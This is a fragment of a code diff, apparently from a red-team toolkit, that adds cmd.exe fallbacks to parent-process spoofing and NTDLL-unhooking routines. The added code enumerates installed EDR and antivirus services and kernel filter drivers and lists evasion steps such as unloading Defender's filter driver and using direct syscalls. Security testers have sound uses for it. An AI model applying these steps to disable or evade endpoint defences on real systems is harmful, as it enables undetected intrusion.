+        resource: `process://ppid-spoof/${parentTarget}`,
+        title: `Process execution via alternative parent context (cmd.exe)`,
+        details: r.stdout.substring(0, 500),
+        remediation: "Monitor wmic process call create and schtasks usage. Validate parent-child relationships.",
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum") {
     const script = `
@@ -1983,6 +2433,48 @@ export async function unhookNtdll(args: string[], timeout: number): Promise<Hook
   const action = argVal(args, "--action") || "check"
   const findings: Finding[] = []
   const output: string[] = ["[*] NTDLL unhooking — EDR hook removal...\n"]
+
+  if (activeExec !== "ps") {
+    const r = await cmd(
+      `echo [*] NTDLL Unhooking — cmd.exe fallback & echo. & ` +
+      `echo [*] Hook detection and removal requires P/Invoke (PowerShell/.NET only) & ` +
+      `echo [*] cmd.exe cannot directly inspect/patch ntdll memory & echo. & ` +
+      `echo === EDR/AV Products Installed (may be hooking ntdll) === & ` +
+      `echo [*] Security services: & ` +
+      `sc query WinDefend 2>nul | findstr /i "DISPLAY_NAME STATE" & ` +
+      `sc query CSFalconService 2>nul | findstr /i "DISPLAY_NAME STATE" & ` +
+      `sc query CbDefense 2>nul | findstr /i "DISPLAY_NAME STATE" & ` +
+      `sc query SentinelAgent 2>nul | findstr /i "DISPLAY_NAME STATE" & ` +
+      `sc query CylanceSvc 2>nul | findstr /i "DISPLAY_NAME STATE" & ` +
+      `sc query elastic-endpoint 2>nul | findstr /i "DISPLAY_NAME STATE" & echo. & ` +
+      `echo === Filter Drivers (kernel-level hooks) === & ` +
+      `fltmc 2>nul || echo     [-] fltmc requires Administrator & echo. & ` +
+      `echo === DLLs in ntdll path === & ` +
+      `dir /b "%SystemRoot%\\System32\\ntdll.dll" 2>nul & ` +
+      `dir /b "%SystemRoot%\\SysWOW64\\ntdll.dll" 2>nul & echo. & ` +
+      `echo === EDR Filter Drivers to Watch === & ` +
+      `fltmc 2>nul | findstr /i "WdFilter csagent cbk7 SentinelMonitor" || echo     [-] No known EDR filter drivers detected (or need admin) & echo. & ` +
+      `echo === cmd.exe Alternatives to Unhooking === & ` +
+      `echo     1. fltmc unload WdFilter  (unload Defender filter — need admin) & ` +
+      `echo     2. Use rundll32 to load clean ntdll copy (advanced) & ` +
+      `echo     3. Direct syscalls via compiled C (csc.exe compile + exec) & ` +
+      `echo     4. Use --exec ps for full P/Invoke hook detection/removal & echo. & ` +
+      `echo [!] NTDLL hook detection/removal requires PowerShell P/Invoke`,
+      timeout,
+    )
+    output.push(r.stdout)
+    findings.push({
+      checkId: "WIN-NTDLL-CMD",
+      provider: "windows",
+      severity: "info",
+      status: "PARTIAL",
+      resource: "ntdll://hooks",
+      title: "EDR products enumerated — hook detection requires PowerShell P/Invoke",
+      details: r.stdout.substring(0, 500),
+      remediation: "Use --exec ps for full NTDLL hook detection and removal capability",
+    })
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "check") {
     const script = `
